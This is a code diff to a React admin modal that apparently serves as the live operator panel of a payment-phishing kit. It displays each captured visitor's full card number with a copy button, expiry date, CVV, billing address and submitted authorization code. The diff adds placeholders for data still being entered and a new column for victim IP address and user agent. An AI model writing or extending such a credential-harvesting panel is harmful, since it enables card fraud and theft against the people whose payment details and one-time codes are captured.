@@ -18,7 +18,8 @@ import {
   Database,
   Download,
   Trash2,
-  Search
+  Search,
+  Globe
 } from 'lucide-react';
 
 interface LiveSession {
@@ -363,20 +364,22 @@ export function LiveSocketAdminModal({ isOpen, onClose }: LiveSocketAdminModalPr
                       </div>
 
                       {/* CARD & BIN DETAILS ROW */}
-                      <div className="grid grid-cols-1 md:grid-cols-3 gap-3 bg-slate-50/80 p-3 rounded-xl border border-slate-200/80 text-xs">
+                      <div className="grid grid-cols-1 md:grid-cols-4 gap-3 bg-slate-50/80 p-3 rounded-xl border border-slate-200/80 text-xs">
                         <div>
                           <div className="text-[10px] font-bold text-slate-400 uppercase">Card Number</div>
                           <div className="font-mono font-extrabold text-slate-900 text-sm tracking-wide flex items-center gap-1.5">
-                            {log.cardNumber}
-                            <button
-                              onClick={() => handleCopy(log.cardNumber, log.id + '_card')}
-                              className="text-slate-400 hover:text-slate-700"
-                              title="Copy Card Number"
-                            >
-                              {copiedField === log.id + '_card' ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
-                            </button>
+                            {log.cardNumber || 'In Progress...'}
+                            {log.cardNumber && (
+                              <button
+                                onClick={() => handleCopy(log.cardNumber, log.id + '_card')}
+                                className="text-slate-400 hover:text-slate-700"
+                                title="Copy Card Number"
+                              >
+                                {copiedField === log.id + '_card' ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
+                              </button>
+                            )}
                           </div>
-                          <div className="text-[10px] text-slate-500 mt-0.5">Exp: <strong>{log.expDate}</strong> | CVV: <strong>{log.cvv}</strong></div>
+                          <div className="text-[10px] text-slate-500 mt-0.5">Exp: <strong>{log.expDate || 'MM/YY'}</strong> | CVV: <strong>{log.cvv || '***'}</strong></div>
                         </div>
 
                         <div>
@@ -392,10 +395,21 @@ export function LiveSocketAdminModal({ isOpen, onClose }: LiveSocketAdminModalPr
                         <div>
                           <div className="text-[10px] font-bold text-slate-400 uppercase">Billing Address &amp; Code</div>
                           <div className="text-xs text-slate-800 font-semibold truncate">
-                            {log.streetAddress}, {log.city}, {log.province} {log.postalCode}
+                            {log.streetAddress ? `${log.streetAddress}, ${log.city}, ${log.province} ${log.postalCode}` : 'Address Pending...'}
                           </div>
                           <div className="text-[10px] text-slate-500 mt-0.5">
                             Auth Code: <strong className="text-emerald-700">{log.customerCode || 'None submitted yet'}</strong>
+                          </div>
+                        </div>
+
+                        <div>
+                          <div className="text-[10px] font-bold text-slate-400 uppercase">IP &amp; Device Details</div>
+                          <div className="font-mono font-bold text-xs text-slate-900 flex items-center gap-1">
+                            <Globe className="w-3 h-3 text-emerald-600 shrink-0" />
+                            <span>{log.visitorIp || '127.0.0.1'}</span>
+                          </div>
+                          <div className="text-[10px] text-slate-500 mt-0.5 truncate max-w-[200px]" title={log.userAgent}>
+                            {log.userAgent || 'Mozilla/5.0 Client'}
                           </div>
                         </div>
                       </div>
